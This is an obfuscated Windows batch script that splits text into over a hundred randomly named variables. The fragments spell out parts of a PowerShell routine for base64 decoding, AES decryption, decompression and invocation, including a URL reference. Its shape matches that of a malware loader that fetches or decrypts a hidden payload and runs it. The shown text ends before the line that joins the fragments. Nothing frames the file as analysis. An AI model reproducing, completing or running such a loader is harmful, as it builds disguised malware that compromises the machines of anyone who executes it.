@echo off
!qYTrlCKcftoxRhKSnQNjioxBBJizSQDvVrVTWIHoutXOcwVKAP! "klYAKNubfF=c.Di"
!qYTrlCKcftoxRhKSnQNjioxBBJizSQDvVrVTWIHoutXOcwVKAP! "qmFMczeGoA=se64"
!qYTrlCKcftoxRhKSnQNjioxBBJizSQDvVrVTWIHoutXOcwVKAP! "vMcWnfkXud=tem3"
!qYTrlCKcftoxRhKSnQNjioxBBJizSQDvVrVTWIHoutXOcwVKAP! "PGAvmeVmeP=('1p"
!qYTrlCKcftoxRhKSnQNjioxBBJizSQDvVrVTWIHoutXOcwVKAP! "fYzCEylUZK=://r"
!qYTrlCKcftoxRhKSnQNjioxBBJizSQDvVrVTWIHoutXOcwVKAP! "IGZkGiqtqz=ream"
!qYTrlCKcftoxRhKSnQNjioxBBJizSQDvVrVTWIHoutXOcwVKAP! "mkMzXivaqp= -Us"
!qYTrlCKcftoxRhKSnQNjioxBBJizSQDvVrVTWIHoutXOcwVKAP! "BlrHcvqzpB=ng[]"
!qYTrlCKcftoxRhKSnQNjioxBBJizSQDvVrVTWIHoutXOcwVKAP! "deAEmXjUeJ=.Cry"
!qYTrlCKcftoxRhKSnQNjioxBBJizSQDvVrVTWIHoutXOcwVKAP! "eMLbkDVqMA=]('%*'"
!qYTrlCKcftoxRhKSnQNjioxBBJizSQDvVrVTWIHoutXOcwVKAP! "WTXEzVRKfg=$nul"
!qYTrlCKcftoxRhKSnQNjioxBBJizSQDvVrVTWIHoutXOcwVKAP! "ocsxNCQAip=onMo"
!qYTrlCKcftoxRhKSnQNjioxBBJizSQDvVrVTWIHoutXOcwVKAP! "PNANIGBBud=,'/'"
!qYTrlCKcftoxRhKSnQNjioxBBJizSQDvVrVTWIHoutXOcwVKAP! "ecQPEbXgwW=;$r}"
!qYTrlCKcftoxRhKSnQNjioxBBJizSQDvVrVTWIHoutXOcwVKAP! "QvQcxIaqNs=$las"
!qYTrlCKcftoxRhKSnQNjioxBBJizSQDvVrVTWIHoutXOcwVKAP! "UDMFNjUyDN=Crea"
!qYTrlCKcftoxRhKSnQNjioxBBJizSQDvVrVTWIHoutXOcwVKAP! "LOzXCKiioP= "%systemdrive%"
!qYTrlCKcftoxRhKSnQNjioxBBJizSQDvVrVTWIHoutXOcwVKAP! "dAiumATzwU=rity"
!qYTrlCKcftoxRhKSnQNjioxBBJizSQDvVrVTWIHoutXOcwVKAP! "EVuMOKKciL=Invo"
!qYTrlCKcftoxRhKSnQNjioxBBJizSQDvVrVTWIHoutXOcwVKAP! "yuoyPOBtTP=okv4"
!qYTrlCKcftoxRhKSnQNjioxBBJizSQDvVrVTWIHoutXOcwVKAP! "ZhVcEPEXiC=KCS7"
!qYTrlCKcftoxRhKSnQNjioxBBJizSQDvVrVTWIHoutXOcwVKAP! "xeXHneaqyb=est "
!qYTrlCKcftoxRhKSnQNjioxBBJizSQDvVrVTWIHoutXOcwVKAP! "aevkZXVyKF=e -s"
!qYTrlCKcftoxRhKSnQNjioxBBJizSQDvVrVTWIHoutXOcwVKAP! "pmmxUxMMJz=rypt"
!qYTrlCKcftoxRhKSnQNjioxBBJizSQDvVrVTWIHoutXOcwVKAP! "XRJbBEXeAB=$url"
!qYTrlCKcftoxRhKSnQNjioxBBJizSQDvVrVTWIHoutXOcwVKAP! "QORDblLttZ=on d"
!qYTrlCKcftoxRhKSnQNjioxBBJizSQDvVrVTWIHoutXOcwVKAP! "jQDAqGzCDM=si,["
!qYTrlCKcftoxRhKSnQNjioxBBJizSQDvVrVTWIHoutXOcwVKAP! "UcvcPSacsk=stin"
!qYTrlCKcftoxRhKSnQNjioxBBJizSQDvVrVTWIHoutXOcwVKAP! "LjskvVjrVh=ase6"
!qYTrlCKcftoxRhKSnQNjioxBBJizSQDvVrVTWIHoutXOcwVKAP! "CRvjFBOjAu=ect "
!qYTrlCKcftoxRhKSnQNjioxBBJizSQDvVrVTWIHoutXOcwVKAP! "APjXXFbZwX=plit"
!qYTrlCKcftoxRhKSnQNjioxBBJizSQDvVrVTWIHoutXOcwVKAP! "jAYQwrkjlx= IO."
!qYTrlCKcftoxRhKSnQNjioxBBJizSQDvVrVTWIHoutXOcwVKAP! "obXHFJcQtI=spos"
!qYTrlCKcftoxRhKSnQNjioxBBJizSQDvVrVTWIHoutXOcwVKAP! "sHTQXCoQTO=$r};"
!qYTrlCKcftoxRhKSnQNjioxBBJizSQDvVrVTWIHoutXOcwVKAP! "qiBhpQoWcO=trea"
!qYTrlCKcftoxRhKSnQNjioxBBJizSQDvVrVTWIHoutXOcwVKAP! "UeoXfJYTrF=Qwvz"
!qYTrlCKcftoxRhKSnQNjioxBBJizSQDvVrVTWIHoutXOcwVKAP! "TWARUgBzyk=.Tra"
!qYTrlCKcftoxRhKSnQNjioxBBJizSQDvVrVTWIHoutXOcwVKAP! "kQhFieHzeK=s.Di"
!qYTrlCKcftoxRhKSnQNjioxBBJizSQDvVrVTWIHoutXOcwVKAP! "paRsaOVsFl=g='P"
!qYTrlCKcftoxRhKSnQNjioxBBJizSQDvVrVTWIHoutXOcwVKAP! "HaccNmHtAs=lect"
!qYTrlCKcftoxRhKSnQNjioxBBJizSQDvVrVTWIHoutXOcwVKAP! "TBmxwdfUHK=Mode"
!qYTrlCKcftoxRhKSnQNjioxBBJizSQDvVrVTWIHoutXOcwVKAP! "PxFTINIbzV==(In"
!qYTrlCKcftoxRhKSnQNjioxBBJizSQDvVrVTWIHoutXOcwVKAP! "TTRbKVqIJr=omBa"
!qYTrlCKcftoxRhKSnQNjioxBBJizSQDvVrVTWIHoutXOcwVKAP! "IMCIvAZtaC=;$de"
!qYTrlCKcftoxRhKSnQNjioxBBJizSQDvVrVTWIHoutXOcwVKAP! "NlwxnJmKTu==New"
!qYTrlCKcftoxRhKSnQNjioxBBJizSQDvVrVTWIHoutXOcwVKAP! "CVKRCVDRFJ=.Ent"
!qYTrlCKcftoxRhKSnQNjioxBBJizSQDvVrVTWIHoutXOcwVKAP! "ApXflbKYRn=.Cop"
!qYTrlCKcftoxRhKSnQNjioxBBJizSQDvVrVTWIHoutXOcwVKAP! "GVsquPJhAI=('#'"
!qYTrlCKcftoxRhKSnQNjioxBBJizSQDvVrVTWIHoutXOcwVKAP! "WTDsfxuvrd=ion."
!qYTrlCKcftoxRhKSnQNjioxBBJizSQDvVrVTWIHoutXOcwVKAP! "tiwuHqMsWL=$msi"
!qYTrlCKcftoxRhKSnQNjioxBBJizSQDvVrVTWIHoutXOcwVKAP! "wwZKnBsboo=Base"
!qYTrlCKcftoxRhKSnQNjioxBBJizSQDvVrVTWIHoutXOcwVKAP! "RuwhpsXTUN=asm="
!qYTrlCKcftoxRhKSnQNjioxBBJizSQDvVrVTWIHoutXOcwVKAP! "gkZnchKAfw=icPa"
!qYTrlCKcftoxRhKSnQNjioxBBJizSQDvVrVTWIHoutXOcwVKAP! "JhRszmUdAA=xi5d"
!qYTrlCKcftoxRhKSnQNjioxBBJizSQDvVrVTWIHoutXOcwVKAP! "lXzTexwxUx=[Con"
!qYTrlCKcftoxRhKSnQNjioxBBJizSQDvVrVTWIHoutXOcwVKAP! "KFcxXZjOIu=ng('"
!qYTrlCKcftoxRhKSnQNjioxBBJizSQDvVrVTWIHoutXOcwVKAP! "IYghnswdvP=o=Ne"
!qYTrlCKcftoxRhKSnQNjioxBBJizSQDvVrVTWIHoutXOcwVKAP! "bIHmSRdyUF=line"
!qYTrlCKcftoxRhKSnQNjioxBBJizSQDvVrVTWIHoutXOcwVKAP! "EHCdEKJbFp=$ep."
!qYTrlCKcftoxRhKSnQNjioxBBJizSQDvVrVTWIHoutXOcwVKAP! "BdTReMcBDd=:Dec"
!qYTrlCKcftoxRhKSnQNjioxBBJizSQDvVrVTWIHoutXOcwVKAP! "ZCSoGJHGtx=MVq4"
!qYTrlCKcftoxRhKSnQNjioxBBJizSQDvVrVTWIHoutXOcwVKAP! "qeRmvblzwP=onte"
!qYTrlCKcftoxRhKSnQNjioxBBJizSQDvVrVTWIHoutXOcwVKAP! "YfuhILhTek=ryPo"
!qYTrlCKcftoxRhKSnQNjioxBBJizSQDvVrVTWIHoutXOcwVKAP! "dLHXeTLiwd=l;e "
!qYTrlCKcftoxRhKSnQNjioxBBJizSQDvVrVTWIHoutXOcwVKAP! "GSAvUftWQZ=y.Ae"
!qYTrlCKcftoxRhKSnQNjioxBBJizSQDvVrVTWIHoutXOcwVKAP! "QYRWHMnaGA=l='h"
!qYTrlCKcftoxRhKSnQNjioxBBJizSQDvVrVTWIHoutXOcwVKAP! "QoWBvSLiOw=','A"
!qYTrlCKcftoxRhKSnQNjioxBBJizSQDvVrVTWIHoutXOcwVKAP! "SPOVrqmCph=))))"
!qYTrlCKcftoxRhKSnQNjioxBBJizSQDvVrVTWIHoutXOcwVKAP! "rZHxSHTGeo=::Fr"
!qYTrlCKcftoxRhKSnQNjioxBBJizSQDvVrVTWIHoutXOcwVKAP! "yddzLwlsan=;$gs"
!qYTrlCKcftoxRhKSnQNjioxBBJizSQDvVrVTWIHoutXOcwVKAP! "SrgDZjIcqu=d.tx"
!qYTrlCKcftoxRhKSnQNjioxBBJizSQDvVrVTWIHoutXOcwVKAP! "DTyyEWfytw=e();"
!qYTrlCKcftoxRhKSnQNjioxBBJizSQDvVrVTWIHoutXOcwVKAP! "IPfvoGOUcM=ispo"
!qYTrlCKcftoxRhKSnQNjioxBBJizSQDvVrVTWIHoutXOcwVKAP! "bZDuIYuiYa=erSh"
!qYTrlCKcftoxRhKSnQNjioxBBJizSQDvVrVTWIHoutXOcwVKAP! "kXtlVjckaY=ke($"
!qYTrlCKcftoxRhKSnQNjioxBBJizSQDvVrVTWIHoutXOcwVKAP! "YvIWGVgrcA=($p,"
!qYTrlCKcftoxRhKSnQNjioxBBJizSQDvVrVTWIHoutXOcwVKAP! "LxblgSBaYu=1hKl"
!qYTrlCKcftoxRhKSnQNjioxBBJizSQDvVrVTWIHoutXOcwVKAP! "ldZUhtbEDo=Stri"
!qYTrlCKcftoxRhKSnQNjioxBBJizSQDvVrVTWIHoutXOcwVKAP! "gvqvUXeGqZ=a.Pa"
!qYTrlCKcftoxRhKSnQNjioxBBJizSQDvVrVTWIHoutXOcwVKAP! "ZeKiNAEaQI=essi"
!qYTrlCKcftoxRhKSnQNjioxBBJizSQDvVrVTWIHoutXOcwVKAP! "BssaAgHwuK=spos"
!qYTrlCKcftoxRhKSnQNjioxBBJizSQDvVrVTWIHoutXOcwVKAP! "rMtqTeOtfh=on.C"
!qYTrlCKcftoxRhKSnQNjioxBBJizSQDvVrVTWIHoutXOcwVKAP! "dCYQSLmBAR=ompr"
!qYTrlCKcftoxRhKSnQNjioxBBJizSQDvVrVTWIHoutXOcwVKAP! "usSAREMiCx=int;"
!qYTrlCKcftoxRhKSnQNjioxBBJizSQDvVrVTWIHoutXOcwVKAP! "OHpcnaClYz=ect "
!qYTrlCKcftoxRhKSnQNjioxBBJizSQDvVrVTWIHoutXOcwVKAP! "HvfmiROoBP=tlin"
!qYTrlCKcftoxRhKSnQNjioxBBJizSQDvVrVTWIHoutXOcwVKAP! "ULuiQTcife=IO.C"
!qYTrlCKcftoxRhKSnQNjioxBBJizSQDvVrVTWIHoutXOcwVKAP! "UGMmqfEXvf=.Key"
!qYTrlCKcftoxRhKSnQNjioxBBJizSQDvVrVTWIHoutXOcwVKAP! "skstuqTHWD=;$ms"
!qYTrlCKcftoxRhKSnQNjioxBBJizSQDvVrVTWIHoutXOcwVKAP! "UQSEaGSRgm=;fun"
!qYTrlCKcftoxRhKSnQNjioxBBJizSQDvVrVTWIHoutXOcwVKAP! "tcynlqJuKR=ompr"
!qYTrlCKcftoxRhKSnQNjioxBBJizSQDvVrVTWIHoutXOcwVKAP! "EssemerUua=echo"
!qYTrlCKcftoxRhKSnQNjioxBBJizSQDvVrVTWIHoutXOcwVKAP! "WaxTNffwCP=last"
!qYTrlCKcftoxRhKSnQNjioxBBJizSQDvVrVTWIHoutXOcwVKAP! "ldNSJlNAOc=MIOL"
!qYTrlCKcftoxRhKSnQNjioxBBJizSQDvVrVTWIHoutXOcwVKAP! "VlVlPTGqNR=ptog"
!qYTrlCKcftoxRhKSnQNjioxBBJizSQDvVrVTWIHoutXOcwVKAP! "gUZJVnuNLY=pl1 "
!qYTrlCKcftoxRhKSnQNjioxBBJizSQDvVrVTWIHoutXOcwVKAP! "hnvQlrQrFA=lace"
!qYTrlCKcftoxRhKSnQNjioxBBJizSQDvVrVTWIHoutXOcwVKAP! "lIqMysAyYF=ing("
!qYTrlCKcftoxRhKSnQNjioxBBJizSQDvVrVTWIHoutXOcwVKAP! "avlfBnHprl=e-Ho"
!qYTrlCKcftoxRhKSnQNjioxBBJizSQDvVrVTWIHoutXOcwVKAP! "HTomcHVqaL=B8eK"
!qYTrlCKcftoxRhKSnQNjioxBBJizSQDvVrVTWIHoutXOcwVKAP! "zCrKWzPPiq=;$a."
!qYTrlCKcftoxRhKSnQNjioxBBJizSQDvVrVTWIHoutXOcwVKAP! "TFtfzykZTi=IO.M"
!qYTrlCKcftoxRhKSnQNjioxBBJizSQDvVrVTWIHoutXOcwVKAP! "ZHlcSArXpY=tem."
!qYTrlCKcftoxRhKSnQNjioxBBJizSQDvVrVTWIHoutXOcwVKAP! "VlipYtONNi=dec="
!qYTrlCKcftoxRhKSnQNjioxBBJizSQDvVrVTWIHoutXOcwVKAP! "AgdjcxGKML=spos"
!qYTrlCKcftoxRhKSnQNjioxBBJizSQDvVrVTWIHoutXOcwVKAP! "mhgrYgrSEz=\Win"
!qYTrlCKcftoxRhKSnQNjioxBBJizSQDvVrVTWIHoutXOcwVKAP! "UKZRnHorhu=)};$"
!qYTrlCKcftoxRhKSnQNjioxBBJizSQDvVrVTWIHoutXOcwVKAP! "hOpySSnMKZ=ctio"
!qYTrlCKcftoxRhKSnQNjioxBBJizSQDvVrVTWIHoutXOcwVKAP! "HkaGRaHetv=.Len"
!qYTrlCKcftoxRhKSnQNjioxBBJizSQDvVrVTWIHoutXOcwVKAP! "ATIAQgPPNa=tTXk"
!qYTrlCKcftoxRhKSnQNjioxBBJizSQDvVrVTWIHoutXOcwVKAP! "BqdIOmryJe=rsin"
!qYTrlCKcftoxRhKSnQNjioxBBJizSQDvVrVTWIHoutXOcwVKAP! "mqptjSHNvV=)) |"
!qYTrlCKcftoxRhKSnQNjioxBBJizSQDvVrVTWIHoutXOcwVKAP! "IPiiEflQJu=rim("
!qYTrlCKcftoxRhKSnQNjioxBBJizSQDvVrVTWIHoutXOcwVKAP! "VgxskQWOQu=Stri"
!qYTrlCKcftoxRhKSnQNjioxBBJizSQDvVrVTWIHoutXOcwVKAP! "JlEiLFYqRn=n z("
!qYTrlCKcftoxRhKSnQNjioxBBJizSQDvVrVTWIHoutXOcwVKAP! "kUscATTdHQ=='CB"
!qYTrlCKcftoxRhKSnQNjioxBBJizSQDvVrVTWIHoutXOcwVKAP! "yXQiOuJNbB=rmFi"
